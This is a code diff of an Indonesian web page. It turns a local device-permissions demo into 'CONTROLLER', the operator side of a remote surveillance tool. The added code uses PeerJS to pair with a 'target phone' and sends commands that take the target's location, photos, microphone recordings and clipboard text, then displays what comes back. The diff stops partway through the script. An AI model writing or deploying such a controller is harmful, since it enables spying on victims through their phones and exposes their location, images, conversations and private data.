@@ -2,822 +2,301 @@
 <html lang="id">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
-  <title>HP Controller By HANZZ</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+  <title>CONTROLLER - Pengendali</title>
   <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      -webkit-tap-highlight-color: transparent;
-    }
-
+    * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
-      background-color: white;
-      font-family: system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
-      padding: 20px 16px 40px;
-      color: #01579b;
+      background: linear-gradient(135deg, #0277bd, #4fc3f7);
+      font-family: system-ui, sans-serif;
+      min-height: 100vh;
+      padding: 20px;
     }
-
     .container {
-      max-width: 650px;
+      max-width: 600px;
       margin: 0 auto;
       background: white;
-      border-radius: 32px;
-      box-shadow: 0 8px 20px rgba(2, 136, 209, 0.08);
-      padding: 20px 18px 28px;
-      border: 1px solid #b3e5fc;
+      border-radius: 40px;
+      padding: 24px;
+      box-shadow: 0 20px 40px rgba(0,0,0,0.2);
     }
-
-    h1 {
-      font-size: 1.7rem;
-      font-weight: 600;
-      background: linear-gradient(135deg, #0277bd, #4fc3f7);
-      background-clip: text;
-      -webkit-background-clip: text;
-      color: transparent;
-      margin-bottom: 0.3rem;
-      letter-spacing: -0.3px;
-    }
-
-    .sub {
-      color: #0288d1;
-      border-left: 4px solid #4fc3f7;
-      padding-left: 12px;
-      margin: 6px 0 18px 0;
-      font-size: 0.85rem;
-      font-weight: 500;
-      background: #e1f5fe50;
-      border-radius: 12px;
-    }
-
-    .permission-panel {
+    h1 { color: #0277bd; font-size: 1.6rem; margin-bottom: 5px; }
+    .sub { color: #666; font-size: 0.8rem; margin-bottom: 20px; }
+    
+    .pairing-section {
       background: #e1f5fe;
       border-radius: 28px;
-      padding: 16px 18px;
-      margin-bottom: 28px;
-      border: 1px solid #b3e5fc;
-      transition: all 0.2s;
+      padding: 16px;
+      margin-bottom: 20px;
     }
-
-    .perm-title {
-      font-weight: 600;
-      color: #01579b;
+    .pair-input {
       display: flex;
-      align-items: center;
-      gap: 10px;
-      margin-bottom: 12px;
-      font-size: 0.9rem;
-    }
-
-    .perm-badge {
-      background: white;
-      border-radius: 40px;
-      padding: 4px 12px;
-      font-size: 0.7rem;
-      font-weight: normal;
-      color: #0277bd;
-      display: inline-block;
-    }
-
-    .perm-status {
-      display: flex;
-      flex-wrap: wrap;
       gap: 12px;
-      justify-content: space-between;
-      align-items: center;
+      margin-top: 12px;
+      flex-wrap: wrap;
     }
-
-    .status-text {
-      font-size: 0.8rem;
-      color: #0d47a1;
-      background: #ffffffc9;
-      padding: 6px 12px;
-      border-radius: 32px;
+    .pair-input input {
+      flex: 1;
+      padding: 14px 18px;
+      border-radius: 48px;
+      border: 1px solid #4fc3f7;
+      font-size: 1rem;
     }
-
+    .pair-input button {
+      background: #0288d1;
+      border: none;
+      padding: 14px 24px;
+      border-radius: 48px;
+      color: white;
+      font-weight: bold;
+      cursor: pointer;
+    }
+    .status-connection {
+      background: #0d47a1;
+      color: white;
+      padding: 12px;
+      border-radius: 40px;
+      text-align: center;
+      margin-bottom: 20px;
+      font-weight: bold;
+    }
+    .connected { background: #2e7d32; }
+    
     .buttons-grid {
       display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
-      gap: 16px;
-      margin: 28px 0 20px;
+      grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+      gap: 12px;
+      margin: 20px 0;
     }
-
     .ctrl-btn {
       background: white;
-      border: 1.5px solid #81d4fa;
-      border-radius: 48px;
+      border: 2px solid #4fc3f7;
+      border-radius: 40px;
       padding: 14px 6px;
-      font-weight: 600;
-      font-size: 1rem;
+      font-weight: bold;
       color: #0277bd;
-      transition: 0.2s;
       cursor: pointer;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 8px;
-      backdrop-filter: blur(2px);
-      box-shadow: 0 2px 6px rgba(0,0,0,0.02);
     }
-
-    .ctrl-btn:active {
-      background: #e1f5fe;
-      transform: scale(0.97);
-      border-color: #0288d1;
-    }
-
-    .output-area {
-      margin-top: 24px;
-      background: #f5fafe;
-      border-radius: 28px;
-      padding: 16px 18px;
-      border: 1px solid #b3e5fc;
-      word-break: break-word;
-    }
-
-    .output-title {
-      font-size: 0.75rem;
-      text-transform: uppercase;
-      letter-spacing: 1px;
-      font-weight: 700;
-      color: #0288d1;
-      margin-bottom: 12px;
-    }
-
-    .output-content {
-      font-size: 0.9rem;
-      color: #014361;
-      line-height: 1.45;
-      max-height: 450px;
+    .ctrl-btn:active { transform: scale(0.96); background: #e1f5fe; }
+    .ctrl-btn:disabled { opacity: 0.4; transform: none; }
+    
+    .result-area {
+      background: #f5f5f5;
+      border-radius: 24px;
+      padding: 16px;
+      margin-top: 16px;
+      max-height: 300px;
       overflow-y: auto;
     }
-
-    .camera-options {
-      display: flex;
-      gap: 14px;
-      margin: 12px 0;
-      flex-wrap: wrap;
-    }
-
-    .cam-choice {
-      background: #e1f5fe;
-      padding: 10px 20px;
-      border-radius: 40px;
-      font-size: 0.9rem;
-      font-weight: 600;
-      cursor: pointer;
-      border: none;
-      color: #01579b;
-      flex: 1;
-      min-width: 120px;
-    }
-
-    .cam-choice:active {
-      background: #b3e5fc;
-      transform: scale(0.97);
-    }
-
-    video, canvas {
-      border-radius: 20px;
-      margin-top: 12px;
-      width: 100%;
-      max-width: 320px;
-      border: 1px solid #b3e5fc;
-      background: #000;
-    }
-
-    .action-buttons {
-      display: flex;
-      gap: 12px;
-      margin-top: 12px;
-      flex-wrap: wrap;
-    }
-
-    .action-btn {
-      background: #0288d1;
-      border: none;
-      padding: 10px 18px;
-      border-radius: 40px;
-      color: white;
+    .result-title {
       font-weight: bold;
-      cursor: pointer;
+      color: #0277bd;
+      margin-bottom: 10px;
     }
-
-    .close-btn {
-      background: #ff8a65;
+    .result-item {
+      background: white;
+      padding: 10px;
+      border-radius: 16px;
+      margin-bottom: 8px;
+      font-size: 0.8rem;
+      word-break: break-word;
     }
-
-    .microphone-ui {
-      background: #ffffffcc;
-      border-radius: 40px;
-      padding: 12px;
-      margin-top: 12px;
-      display: flex;
-      gap: 12px;
-      align-items: center;
-      flex-wrap: wrap;
-    }
-
-    .microphone-ui button {
-      background: #0288d1;
-      border: none;
-      padding: 8px 20px;
-      border-radius: 40px;
-      color: white;
-      font-weight: bold;
-      cursor: pointer;
-    }
-
-    .recording-indicator {
-      color: #d32f2f;
-      font-weight: bold;
-      animation: pulse 1s infinite;
-    }
-
-    @keyframes pulse {
-      0% { opacity: 1; }
-      50% { opacity: 0.5; }
-      100% { opacity: 1; }
-    }
-
-    .google-maps-link {
-      display: inline-block;
-      background: #0288d1;
-      color: white;
-      padding: 10px 18px;
-      border-radius: 40px;
-      text-decoration: none;
-      margin-top: 12px;
-      font-weight: bold;
-    }
+    img.result-img { max-width: 100%; border-radius: 16px; margin-top: 8px; }
+    audio { width: 100%; margin-top: 8px; }
   </style>
 </head>
 <body>
 <div class="container">
-  <h1>📱 HP Controller By HANZZ</h1>
-
-  <div class="permission-panel">
-    <div class="perm-title">
-      <span>Izin Akses</span>
+  <h1>🎮 CONTROLLER</h1>
+  <div class="sub">Hubungkan ke HP Target untuk mengontrol</div>
+  
+  <div class="pairing-section">
+    <div style="font-weight:bold;">🔗 Masukkan Kode Pairing Target</div>
+    <div class="pair-input">
+      <input type="text" id="peerIdInput" placeholder="Contoh: 3a4b5c6d-7e8f...">
+      <button id="connectBtn">Hubungkan</button>
     </div>
-    <div class="perm-status">
-      <span class="status-text" id="permSummary">⏳ Memuat izin dari halaman awal...</span>
-    </div>
-    <div style="font-size:12px; margin-top:10px; color:#0b5e7e;">✔️ Akses yang dizinkan: lokasi, kamera, mikrofon, notifikasi, clipboard, akses aplikasi (partial)</div>
   </div>
-
+  
+  <div class="status-connection" id="connectionStatus">
+    ⚪ Belum terhubung
+  </div>
+  
   <div class="buttons-grid">
-    <button class="ctrl-btn" id="btnLokasi">🗾 Akses Lokasi</button>
-    <button class="ctrl-btn" id="btnKamera">📷 Akses Kamera</button>
-    <button class="ctrl-btn" id="btnNotif">🔔 Kirim Notifikasi</button>
-    <button class="ctrl-btn" id="btnMikrofon">🎙️ Akses Mikrofon</button>
-    <button class="ctrl-btn" id="btnClipboard">📋 Akses Papan Klip</button>
-    <button class="ctrl-btn" id="btnAplikasi">📱 Akses Aplikasi</button>
+    <button class="ctrl-btn" id="btnLokasi" disabled>📍 Ambil Lokasi</button>
+    <button class="ctrl-btn" id="btnNotif" disabled>🔔 Kirim Notifikasi</button>
+    <button class="ctrl-btn" id="btnFoto" disabled>📷 Ambil Foto</button>
+    <button class="ctrl-btn" id="btnRekam" disabled>🎙️ Mulai Rekam</button>
+    <button class="ctrl-btn" id="btnStopRekam" disabled>⏹️ Stop & Kirim</button>
+    <button class="ctrl-btn" id="btnClipboard" disabled>📋 Baca Clipboard</button>
   </div>
-
-  <div class="output-area" id="outputArea">
-    <div class="output-title">Executor</div>
-    <div class="output-content" id="outputContent">
-      ⏳ Load izin dari halaman sebelumnya...
+  
+  <div class="result-area">
+    <div class="result-title">📡 Hasil dari HP Target</div>
+    <div id="resultList">
+      <div class="result-item">Belum ada hasil, hubungkan dulu ke target</div>
     </div>
   </div>
 </div>
 
+<script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
 <script>
-  (function() {
-    // ======================= STATE =======================
-    let permissionsGranted = {
-      location: false,
-      camera: false,
-      microphone: false,
-      notifications: false,
-      clipboard: false,
-      apps: false
-    };
-
-    let mediaRecorder = null;
-    let audioChunks = [];
-    let isRecording = false;
-    let currentAudioStream = null;
-    let activeCameraStream = null;
-    let activeCameraCard = null;
-
-    const outputDiv = document.getElementById('outputContent');
-    const permSummarySpan = document.getElementById('permSummary');
-
-    function clearOutputArea() {
-      outputDiv.innerHTML = '';
-    }
-
-    function logToOutput(message, isError = false) {
-      const p = document.createElement('div');
-      p.style.marginBottom = '10px';
-      p.style.padding = '6px 0';
-      p.style.borderBottom = '1px solid #cfe9ff';
-      p.style.color = isError ? '#c62828' : '#014361';
-      p.innerHTML = isError ? `⚠️ ${message}` : `✅ ${message}`;
-      outputDiv.appendChild(p);
-      outputDiv.scrollTop = outputDiv.scrollHeight;
-      if (outputDiv.children.length > 30) {
-        while(outputDiv.children.length > 25) outputDiv.removeChild(outputDiv.firstChild);
-      }
-    }
-
-    function updatePermSummary() {
-      const grantedList = [];
-      if (permissionsGranted.location) grantedList.push('🗾 Lokasi');
-      if (permissionsGranted.camera) grantedList.push('📷 Kamera');
-      if (permissionsGranted.microphone) grantedList.push('🎙️ mikrofon');
-      if (permissionsGranted.notifications) grantedList.push('🔔 Notifikasi');
-      if (permissionsGranted.clipboard) grantedList.push('📋 Papan Klip');
-      if (permissionsGranted.apps) grantedList.push('📱 apk');
-      if (grantedList.length === 0) permSummarySpan.innerText = '⚠️ Belum ada izin, izinkan all permission';
-      else permSummarySpan.innerText = '✅ ' + grantedList.join(' · ');
-    }
-
-    function stopAnyCamera() {
-      if (activeCameraStream) {
-        activeCameraStream.getTracks().forEach(track => track.stop());
-        activeCameraStream = null;
-      }
-      if (activeCameraCard && activeCameraCard.parentNode) {
-        activeCameraCard.remove();
-        activeCameraCard = null;
-      }
-    }
-
-    function cleanMicrophoneUI() {
-      const existingMicCard = document.getElementById('temp-mic-card');
-      if (existingMicCard) existingMicCard.remove();
-    }
-
-    // =============== MEMBACA IZIN DARI LOCALSTORAGE (dari index.html) ===============
-    function loadPermissionsFromStorage() {
-      const stored = localStorage.getItem('controllerPermissions');
-      if (stored) {
-        try {
-          const data = JSON.parse(stored);
-          // Cek apakah data masih fresh (dalam 5 menit)
-          if (data.timestamp && (Date.now() - data.timestamp) < 300000) {
-            permissionsGranted = {
-              location: data.location || false,
-              camera: data.camera || false,
-              microphone: data.microphone || false,
-              notifications: data.notifications || false,
-              clipboard: data.clipboard || false,
-              apps: data.apps || false
-            };
-            updatePermSummary();
-            logToOutput(`✅ Memuat izin dari halaman awal (${Object.values(permissionsGranted).filter(v=>v===true).length}/6 izin)`);
-            return true;
-          }
-        } catch(e) {}
-      }
-      // Fallback: minta ulang izin
-      logToOutput('🔄 Tidak ada data izin tersimpan, meminta izin ulang...', false);
-      requestAllPermissionsAgain();
-      return false;
-    }
-
-    // Jika tidak ada localStorage, minta ulang izin
-    async function requestAllPermissionsAgain() {
-      logToOutput('🔄 Meminta semua izin...');
-      await requestLocationPermission();
-      await requestCameraPermission();
-      await requestMicrophonePermission();
-      await requestNotificationPermission();
-      await requestClipboardPermission();
-      await requestAppsPermission();
-      updatePermSummary();
-      logToOutput('✨ Semua proses izin selesai.');
-    }
-
-    async function requestLocationPermission() {
-      return new Promise((resolve) => {
-        if (!navigator.geolocation) {
-          permissionsGranted.location = false;
-          resolve(false);
-          return;
-        }
-        navigator.geolocation.getCurrentPosition(
-          () => { permissionsGranted.location = true; resolve(true); },
-          () => { permissionsGranted.location = false; resolve(false); },
-          { enableHighAccuracy: true, timeout: 8000 }
-        );
-      });
-    }
-
-    async function requestCameraPermission() {
-      try {
-        const tempStream = await navigator.mediaDevices.getUserMedia({ video: true });
-        tempStream.getTracks().forEach(track => track.stop());
-        permissionsGranted.camera = true;
-        return true;
-      } catch (e) {
-        permissionsGranted.camera = false;
-        return false;
-      }
-    }
-
-    async function requestMicrophonePermission() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-        stream.getTracks().forEach(t => t.stop());
-        permissionsGranted.microphone = true;
-        return true;
-      } catch (e) {
-        permissionsGranted.microphone = false;
-        return false;
-      }
-    }
-
-    async function requestNotificationPermission() {
-      if (!('Notification' in window)) {
-        permissionsGranted.notifications = false;
-        return false;
-      }
-      if (Notification.permission === 'granted') {
-        permissionsGranted.notifications = true;
-        return true;
-      }
-      const result = await Notification.requestPermission();
-      permissionsGranted.notifications = (result === 'granted');
-      return permissionsGranted.notifications;
-    }
-
-    async function requestClipboardPermission() {
-      if (!navigator.clipboard || !navigator.clipboard.readText) {
-        permissionsGranted.clipboard = false;
-        return false;
-      }
-      try {
-        await navigator.clipboard.readText();
-        permissionsGranted.clipboard = true;
-        return true;
-      } catch (err) {
-        permissionsGranted.clipboard = false;
-        return false;
-      }
-    }
-
-    async function requestAppsPermission() {
-      if ('getInstalledRelatedApps' in navigator) {
-        try {
-          await navigator.getInstalledRelatedApps();
-          permissionsGranted.apps = true;
-          return true;
-        } catch(e) {
-          permissionsGranted.apps = false;
-          return false;
-        }
-      } else {
-        permissionsGranted.apps = false;
-        return false;
-      }
-    }
-
-    // =============== FITUR LOKASI GOOGLE MAPS ===============
-    async function onGetLocation() {
-      clearOutputArea();
-      if (!permissionsGranted.location) {
-        logToOutput('Izin lokasi belum diberikan. Coba reload atau izinkan manual.', true);
-        return;
-      }
-      if (!navigator.geolocation) {
-        logToOutput('Geolocation tidak didukung browser.', true);
-        return;
-      }
-      logToOutput('Mengambil lokasi akurat...');
-      navigator.geolocation.getCurrentPosition(
-        (position) => {
-          const lat = position.coords.latitude;
-          const lng = position.coords.longitude;
-          const acc = position.coords.accuracy;
-          logToOutput(`🗾 Koordinat: ${lat}, ${lng} | Akurasi ±${Math.round(acc)} meter`);
-          
-          const googleMapsUrl = `https://www.google.com/maps?q=${lat},${lng}&hl=id&z=18`;
-          const mapsLink = document.createElement('a');
-          mapsLink.href = googleMapsUrl;
-          mapsLink.target = "_blank";
-          mapsLink.rel = "noopener noreferrer";
-          mapsLink.className = "google-maps-link";
-          mapsLink.innerHTML = "🗾 Buka di Google Maps";
-          
-          const linkContainer = document.createElement('div');
-          linkContainer.style.marginTop = "10px";
-          linkContainer.appendChild(mapsLink);
-          outputDiv.appendChild(linkContainer);
-          
-          const shortLink = document.createElement('div');
-          shortLink.style.marginTop = "8px";
-          shortLink.style.fontSize = "0.8rem";
-          shortLink.innerHTML = `<a href="${googleMapsUrl}" target="_blank" style="color:#0288d1;">🗾 Google Maps (${lat.toFixed(6)}, ${lng.toFixed(6)})</a>`;
-          outputDiv.appendChild(shortLink);
-        },
-        (err) => {
-          logToOutput(`Gagal lokasi: ${err.message}`, true);
-        },
-        { enableHighAccuracy: true, timeout: 10000 }
-      );
-    }
-
-    // =============== KAMERA LENGKAP ===============
-    async function onShowCamera() {
-      clearOutputArea();
-      stopAnyCamera();
-      if (!permissionsGranted.camera) {
-        logToOutput('Izin kamera belum diberikan.', true);
-        return;
-      }
-      
-      const card = document.createElement('div');
-      card.style.background = '#eef5fc';
-      card.style.borderRadius = '24px';
-      card.style.padding = '16px';
-      card.style.marginTop = '8px';
-      card.id = 'camera-card-temp';
-      
-      const btnDiv = document.createElement('div');
-      btnDiv.className = 'camera-options';
-      
-      const frontBtn = document.createElement('button');
-      frontBtn.innerText = '🤳 Kamera Depan (Mirror)';
-      frontBtn.className = 'cam-choice';
-      
-      const backBtn = document.createElement('button');
-      backBtn.innerText = '📸 Kamera Belakang (Normal)';
-      backBtn.className = 'cam-choice';
-      
-      btnDiv.appendChild(frontBtn);
-      btnDiv.appendChild(backBtn);
-      
-      const videoElem = document.createElement('video');
-      videoElem.autoplay = true;
-      videoElem.playsInline = true;
-      videoElem.muted = true;
-      videoElem.style.width = '100%';
-      videoElem.style.maxWidth = '320px';
-      videoElem.style.borderRadius = '24px';
-      videoElem.style.backgroundColor = '#000';
-      
-      const actionDiv = document.createElement('div');
-      actionDiv.className = 'action-buttons';
-      
-      const captureBtn = document.createElement('button');
-      captureBtn.innerText = '📸 Ambil Foto & Download';
-      captureBtn.className = 'action-btn';
-      
-      const closeBtn = document.createElement('button');
-      closeBtn.innerText = '❌ Tutup Kamera';
-      closeBtn.className = 'action-btn close-btn';
-      
-      actionDiv.appendChild(captureBtn);
-      actionDiv.appendChild(closeBtn);
-      
-      card.appendChild(btnDiv);
-      card.appendChild(videoElem);
-      card.appendChild(actionDiv);
-      outputDiv.appendChild(card);
-      activeCameraCard = card;
-      
-      let currentStream = null;
-      
-      async function startCamera(facingMode, isMirror = false) {
-        if (currentStream) {
-          currentStream.getTracks().forEach(t => t.stop());
-        }
-        try {
-          const constraints = { video: { facingMode: { exact: facingMode } } };
-          const stream = await navigator.mediaDevices.getUserMedia(constraints);
-          currentStream = stream;
-          activeCameraStream = stream;
-          videoElem.srcObject = stream;
-          if (isMirror) {
-            videoElem.style.transform = 'scaleX(-1)';
-          } else {
-            videoElem.style.transform = 'scaleX(1)';
-          }
-          logToOutput(`Kamera ${isMirror ? 'DEPAN (mirror)' : 'BELAKANG'} aktif.`);
-        } catch (err) {
-          logToOutput(`Gagal akses kamera ${facingMode}`, true);
-          try {
-            const fallbackStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
-            currentStream = fallbackStream;
-            activeCameraStream = fallbackStream;
-            videoElem.srcObject = fallbackStream;
-            if (isMirror) videoElem.style.transform = 'scaleX(-1)';
-            else videoElem.style.transform = 'scaleX(1)';
-          } catch(e2) { 
-            logToOutput(`Kamera tidak tersedia: ${e2.message}`, true);
-          }
-        }
-      }
-      
-      frontBtn.onclick = () => startCamera('user', true);
-      backBtn.onclick = () => startCamera('environment', false);
-      
-      captureBtn.onclick = () => {
-        if (!currentStream || !videoElem.videoWidth) {
-          logToOutput('Aktifkan kamera terlebih dahulu (pilih depan/belakang)', true);
-          return;
-        }
-        const canvas = document.createElement('canvas');
-        canvas.width = videoElem.videoWidth;
-        canvas.height = videoElem.videoHeight;
-        const ctx = canvas.getContext('2d');
-        if (videoElem.style.transform === 'scaleX(-1)') {
-          ctx.translate(canvas.width, 0);
-          ctx.scale(-1, 1);
-        }
-        ctx.drawImage(videoElem, 0, 0, canvas.width, canvas.height);
-        canvas.toBlob(blob => {
-          const url = URL.createObjectURL(blob);
-          const a = document.createElement('a');
-          const timestamp = Date.now();
-          a.download = `controllerbyhanzz1_${timestamp}.png`;
-          a.href = url;
-          a.click();
-          URL.revokeObjectURL(url);
-          logToOutput(`Foto tersimpan: controllerbyhanzz1_${timestamp}.png`);
-        }, 'image/png');
-      };
-      
-      closeBtn.onclick = () => {
-        if (currentStream) currentStream.getTracks().forEach(t => t.stop());
-        activeCameraStream = null;
-        card.remove();
-        activeCameraCard = null;
-        logToOutput('Kamera ditutup.');
-      };
-      
-      startCamera('environment', false);
-    }
+  let peer = null;
+  let connection = null;
+  let isConnected = false;
+  
+  const resultList = document.getElementById('resultList');
+  const connectionStatus = document.getElementById('connectionStatus');
+  const peerIdInput = document.getElementById('peerIdInput');
+  const connectBtn = document.getElementById('connectBtn');
+  
+  // Tombol-tombol
+  const btns = {
+    lokasi: document.getElementById('btnLokasi'),
+    notif: document.getElementById('btnNotif'),
+    foto: document.getElementById('btnFoto'),
+    rekam: document.getElementById('btnRekam'),
+    stopRekam: document.getElementById('btnStopRekam'),
+    clipboard: document.getElementById('btnClipboard')
+  };
+  
+  function enableButtons(enabled) {
+    Object.values(btns).forEach(btn => btn.disabled = !enabled);
+  }
+  
+  function addResult(type, data, isError = false) {
+    const div = document.createElement('div');
+    div.className = 'result-item';
+    div.style.borderLeft = isError ? '4px solid #f44336' : '4px solid #4caf50';
     
-    // =============== NOTIFIKASI ===============
-    async function onSendNotification() {
-      clearOutputArea();
-      if (!permissionsGranted.notifications && Notification.permission !== 'granted') {
-        logToOutput('Izin notifikasi belum diberikan.', true);
-        return;
-      }
-      const msg = prompt('✏️ Masukkan pesan notifikasi:', 'Halo dari Controller by Hanzz!');
-      if (msg && msg.trim() !== '') {
-        try {
-          new Notification('📱 Controller Hanzz', { 
-            body: msg, 
-            icon: 'https://cdn-icons-png.flaticon.com/512/5333/5333678.png',
-            vibrate: [200, 100, 200]
-          });
-          logToOutput(`Notifikasi dikirim: "${msg}"`);
-        } catch(e) {
-          logToOutput(`Gagal mengirim notifikasi: ${e.message}`, true);
-        }
-      } else if (msg === null) {
-        logToOutput('Notifikasi dibatalkan');
-      } else {
-        logToOutput('Pesan kosong');
+    let content = `<strong>📌 ${type.toUpperCase()}</strong><br>`;
+    
+    if (isError) {
+      content += `⚠️ Error: ${data.error || data}`;
+    } else {
+      switch(type) {
+        case 'location':
+          content += `📍 Latitude: ${data.lat}<br>📍 Longitude: ${data.lng}<br>🎯 Akurasi: ±${Math.round(data.accuracy)} meter`;
+          break;
+        case 'notification':
+          content += `🔔 Notifikasi: "${data.message}"`;
+          break;
+        case 'photo':
+          content += `📸 Foto berhasil diambil:<br><img src="${data.image}" class="result-img" onclick="window.open(this.src)">`;
+          break;
+        case 'audio':
+          content += `🎵 Rekaman suara:<br><audio controls src="${data.audio}"></audio><br><a href="${data.audio}" download="rekaman_${Date.now()}.mp3">💾 Download MP3</a>`;
+          break;
+        case 'clipboard':
+          content += `📋 Teks clipboard: "${data.text.substring(0, 200)}"`;
+          break;
+        case 'recording_started':
+          content += `🎙️ Rekaman dimulai di target... tunggu hingga selesai (max 15 detik)`;
+          break;
+        default:
+          content += JSON.stringify(data);
       }
     }
     
-    // =============== MIKROFON ===============
-    async function onMicrophoneRecorder() {
-      clearOutputArea();
-      cleanMicrophoneUI();
-      if (!permissionsGranted.microphone) {
-        logToOutput('Izin mikrofon belum diberikan.', true);
-        return;
-      }
-      
-      const micCard = document.createElement('div');
-      micCard.id = 'temp-mic-card';
-      micCard.className = 'microphone-ui';
-      const statusLabel = document.createElement('span');
-      statusLabel.innerText = '🎤 Belum merekam';
-      const startBtn = document.createElement('button');
-      startBtn.innerText = '🎙️ Mulai Rekam';
-      const stopBtn = document.createElement('button');
-      stopBtn.innerText = '⏹️ Stop & Download';
-      stopBtn.disabled = true;
-      
-      micCard.appendChild(statusLabel);
-      micCard.appendChild(startBtn);
-      micCard.appendChild(stopBtn);
-      outputDiv.appendChild(micCard);
-      
-      let mediaRecorderLocal = null;
-      let audioChunksLocal = [];
-      let streamLocal = null;
-      let recordingActive = false;
-      
-      startBtn.onclick = async () => {
-        if (recordingActive) {
-          logToOutput('Sedang merekam', true);
-          return;
-        }
-        try {
-          const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-          streamLocal = stream;
-          mediaRecorderLocal = new MediaRecorder(stream);
-          audioChunksLocal = [];
-          mediaRecorderLocal.ondataavailable = e => audioChunksLocal.push(e.data);
-          mediaRecorderLocal.onstop = () => {
-            const audioBlob = new Blob(audioChunksLocal, { type: 'audio/mpeg' });
-            const url = URL.createObjectURL(audioBlob);
-            const a = document.createElement('a');
-            const timestamp = Date.now();
-            a.download = `controllerbyhanzz1_${timestamp}.mp3`;
-            a.href = url;
-            a.click();
-            URL.revokeObjectURL(url);
-            logToOutput(`Rekaman selesai: controllerbyhanzz1_${timestamp}.mp3`);
-            if (streamLocal) streamLocal.getTracks().forEach(t => t.stop());
-            recordingActive = false;
-            startBtn.disabled = false;
-            stopBtn.disabled = true;
-            statusLabel.innerHTML = '⚫ Siap rekam';
-            statusLabel.style.color = '#000';
-          };
-          mediaRecorderLocal.start();
-          recordingActive = true;
-          startBtn.disabled = true;
-          stopBtn.disabled = false;
-          statusLabel.innerHTML = '🔴 MEREKAM... (klik Stop)';
-          statusLabel.style.color = '#d32f2f';
-          statusLabel.style.animation = 'pulse 1s infinite';
-          logToOutput('Merekam suara... Tekan STOP untuk download.');
-        } catch(err) {
-          logToOutput(`Gagal akses mikrofon: ${err.message}`, true);
-        }
-      };
-      
-      stopBtn.onclick = () => {
-        if (mediaRecorderLocal && mediaRecorderLocal.state === 'recording') {
-          mediaRecorderLocal.stop();
-          stopBtn.disabled = true;
-          statusLabel.style.animation = 'none';
-          statusLabel.innerHTML = '⏹️ Memproses download...';
-        } else {
-          logToOutput('Tidak ada rekaman aktif', true);
-        }
-      };
+    div.innerHTML = content;
+    resultList.prepend(div);
+    if (resultList.children.length > 15) {
+      resultList.removeChild(resultList.lastChild);
+    }
+  }
+  
+  function updateConnectionStatus(text, isConn = false) {
+    isConnected = isConn;
+    connectionStatus.innerHTML = isConn ? `✅ ${text}` : `⚠️ ${text}`;
+    connectionStatus.className = isConn ? 'status-connection connected' : 'status-connection';
+    enableButtons(isConn);
+  }
+  
+  // Kirim perintah ke target
+  function sendCommand(type, extra = {}) {
+    if (!connection || !connection.open) {
+      addResult('error', { error: 'Tidak terhubung ke target' }, true);
+      return;
+    }
+    connection.send({ type, ...extra });
+    addResult('command', `📤 Mengirim perintah: ${type}`);
+  }
+  
+  // Setup koneksi
+  function connectToPeer(peerId) {
+    if (connection) {
+      connection.close();
     }
     
-    // =============== PAPAN KLIP ===============
-    async function onReadClipboard() {
-      clearOutputArea();
-      if (!permissionsGranted.clipboard) {
-        logToOutput('Izin papan klip belum didapat.', true);
-        return;
-      }
-      try {
-        const text = await navigator.clipboard.readText();
-        logToOutput(`📋 Teks dari papan klip: "${text.length > 200 ? text.substring(0,200)+'...' : text}"`);
-        if (text.length === 0) logToOutput('(Papan klip kosong)');
-      } catch (err) {
-        logToOutput(`Gagal membaca clipboard: ${err.message}`, true);
-        permissionsGranted.clipboard = false;
-        updatePermSummary();
-      }
-    }
+    updateConnectionStatus('Menghubungkan...', false);
+    connection = peer.connect(peerId);
     
-    // =============== APLIKASI ===============
-    async function onListApps() {
-      clearOutputArea();
-      if (!permissionsGranted.apps) {
-        logToOutput('Akses aplikasi tidak tersedia.', true);
-        return;
-      }
-      if ('getInstalledRelatedApps' in navigator) {
-        try {
-          const apps = await navigator.getInstalledRelatedApps();
-          if (apps.length === 0) {
-            logToOutput('Tidak ada aplikasi terkait yang terdaftar.');
-          } else {
-            const appNames = apps.map(app => app.name || app.platform || 'Aplikasi').join(', ');
-            logToOutput(`📱 Aplikasi terdeteksi: ${appNames}`);
-          }
-        } catch(e) {
-          logToOutput(`Error baca aplikasi: ${e.message}`, true);
-        }
-      } else {
-        logToOutput('Browser tidak mendukung fitur daftar aplikasi.', true);
-      }
-    }
-    
-    // =============== BIND EVENT ===============
-    document.getElementById('btnLokasi').addEventListener('click', onGetLocation);
-    document.getElementById('btnKamera').addEventListener('click', onShowCamera);
-    document.getElementById('btnNotif').addEventListener('click', onSendNotification);
-    document.getElementById('btnMikrofon').addEventListener('click', onMicrophoneRecorder);
-    document.getElementById('btnClipboard').addEventListener('click', onReadClipboard);
-    document.getElementById('btnAplikasi').addEventListener('click', onListApps);
-    
-    // Inisialisasi: baca izin dari localStorage
-    window.addEventListener('load', () => {
-      loadPermissionsFromStorage();
+    connection.on('open', () => {
+      updateConnectionStatus(`Terhubung ke ${peerId}`, true);
+      addResult('connection', `✅ Berhasil terhubung ke target: ${peerId}`);
     });
-  })();
+    
+    connection.on('data', (data) => {
+      if (data.response) {
+        addResult(data.type, data.data, data.data?.error);
+      } else {
+        addResult('info', data);
+      }
+    });
+    
+    connection.on('close', () => {
+      updateConnectionStatus('Koneksi terputus', false);
+      addResult('connection', '❌ Koneksi ke target terputus', true);
+      connection = null;
+    });
+    
+    connection.on('error', (err) => {
+      updateConnectionStatus('Error koneksi', false);
+      addResult('error', { error: err.toString() }, true);
+    });
+  }
+  
+  // Inisialisasi Peer (Controller juga punya ID sendiri)
+  function initPeer() {
+    peer = new Peer();
+    
+    peer.on('open', (id) => {
+      console.log('Controller ID:', id);
+      addResult('info', `🆔 ID Controller: ${id.substring(0, 15)}... (bisa diabaikan)`);
+    });
+    
+    peer.on('error', (err) => {
+      console.error('Peer error:', err);
+      if (err.type === 'unavailable-id') {
+        addResult('error', 'ID peer tidak valid', true);
+      }
+    });
+  }
+  
+  // Event tombol
+  btns.lokasi.onclick = () => sendCommand('location');
+  btns.notif.onclick = () => {
